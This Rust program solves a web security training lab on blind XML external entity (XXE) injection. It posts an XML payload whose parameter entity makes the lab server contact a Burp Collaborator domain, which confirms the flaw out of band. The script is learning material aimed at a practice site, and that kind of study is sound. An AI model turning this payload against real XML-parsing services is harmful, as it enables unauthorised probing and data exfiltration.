/*******************************************************************************
*
* Lab: Blind XXE with out-of-band interaction via XML parameter entities
*
* Hack Steps: 
*      1. Use a parameter entity to issue a DNS lookup to burp collaborator
*      2. Check your burp collaborator for the DNS lookup
*
********************************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a40005e0356af0780672b3e00fd0094.web-security-academy.net";

// Change this to your burp collaborator domain
const BURP_COLLABORATOR: &str = "suqxqekiuohqxjjfanrc03z37udl1bp0.oastify.com";

fn main() {
    println!("⦗#⦘ Injection point: {}", "Check stock request".yellow(),);

    // payload to issue a DNS lookup to burp collaborator using a parameter entity
    print!("❯❯ Using a parameter entity to issue a DNS lookup to burp collaborator.. ");
    io::stdout().flush().unwrap();

    let payload = format!(
        r###"<?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://{BURP_COLLABORATOR}"> %xxe; ]>
            <stockCheck>
                <productId>
                    2
                </productId>
                <storeId>
                    1
                </storeId>
            </stockCheck>"###
    );
    check_stock_with_payload(payload);

    println!("{}", "OK".green());
    println!("🗹 Check your burp collaborator for the DNS lookup");
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn check_stock_with_payload(payload: String) -> Response {
    let client = build_web_client();
    client
        .post(format!("{LAB_URL}/product/stock"))
        .header("Content-Type", "application/xml")
        .body(payload)
        .send()
        .expect(&format!(
            "{}",
            "⦗!⦘ Failed to fetch the page with the injected payload".red()
        ))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
